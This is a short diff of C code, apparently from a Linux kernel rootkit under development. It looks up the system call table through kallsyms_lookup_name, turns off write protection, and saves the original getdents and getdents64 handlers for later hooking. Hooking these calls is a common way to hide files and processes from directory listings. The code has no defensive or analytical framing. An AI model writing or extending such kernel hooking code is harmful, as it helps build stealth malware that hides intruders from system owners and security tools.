@@ -3,19 +3,28 @@
 #include "hook.h"
 
 
-unsigned long *sys_call_table;
+void **sys_call_table;
+
+long (*sys_getdents)(unsigned, struct linux_dirent *, unsigned);
+long (*sys_getdents64)(unsigned, struct linux_dirent64 *, unsigned);
+
 
 int
 retrieve_sys_call_table(void)
 {
+    return NULL != (sys_call_table
+        = (void **)kallsyms_lookup_name("sys_call_table"));
+}
+
+void
+init_hooks(void)
+{
     disable_protection();
 
-    int ret = !(sys_call_table
-        = (unsigned long *)kallsyms_lookup_name("sys_call_table"));
+	sys_getdents = (void *)sys_call_table[__NR_getdents];
+	sys_getdents64 = (void *)sys_call_table[__NR_getdents64];
 
     enable_protection();
-
-    return ret;
 }
 
 void
